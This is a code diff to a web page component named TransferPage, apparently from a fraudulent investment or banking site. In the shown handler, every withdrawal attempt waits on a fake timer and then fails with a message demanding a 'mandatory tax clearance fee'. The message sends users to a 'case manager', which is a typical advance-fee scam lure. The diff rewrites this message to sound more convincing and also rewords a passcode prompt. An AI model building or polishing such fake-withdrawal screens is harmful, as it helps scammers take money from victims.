@@ -130,7 +130,7 @@ export default function TransferPage() {
     setError("");
     await new Promise(r => setTimeout(r, 1800));
     setLoading(false);
-    setError("Your withdrawal request cannot be processed until the required tax clearance fee is completed. Please settle the tax payment to proceed with this transaction. Contact support for assistance.");
+    setError("Your withdrawal cannot be processed at this time. A mandatory tax clearance fee must be settled before this transaction can be released. Please contact your case manager or our support team via live chat or email to resolve this and proceed.");
   }
 
   if (loadingData) return (
@@ -156,9 +156,9 @@ export default function TransferPage() {
                 <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
               </svg>
             </div>
-            <h2 className="text-lg font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Authorization Required</h2>
+            <h2 className="text-lg font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdrawal Authorization</h2>
             <p className="text-sm text-white/50 leading-relaxed max-w-xs">
-              Please enter your one time passcode to authorize this withdrawal. Do not share with anyone. Contact support for any difficulties.
+              Enter your one-time passcode to authorize this withdrawal. This code is personal — do not share it with anyone. Contact support if you have not received your code or are experiencing difficulties.
             </p>
           </div>
 
